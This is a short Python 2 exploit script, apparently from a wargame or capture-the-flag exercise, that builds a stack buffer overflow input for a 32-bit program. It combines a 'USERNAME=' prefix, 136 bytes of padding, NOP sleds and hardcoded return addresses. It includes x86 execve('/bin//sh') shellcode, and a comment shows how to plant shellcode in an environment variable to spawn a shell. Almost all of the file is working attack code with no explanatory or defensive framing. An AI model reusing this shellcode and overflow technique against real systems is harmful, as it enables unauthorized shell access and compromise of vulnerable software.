import struct


user = "USERNAME="
nop = "\x90"*70
first_nop = "\x90"*20
second_nop = "\x90"*23
sc = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = "\xCC"*4
pad = "A"*136
eax = struct.pack('I',0x804880b)
stack = struct.pack('I',0xbffff740)
scenv = struct.pack('I',0xbffffd4d)

print user+pad+"\x08\xb0\x04\x08"+"A"*28+scenv # JUMP INTO EAX move forward till hit EIP then
# shell code to the env with 
# export SHELLCODE=`python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 "'`

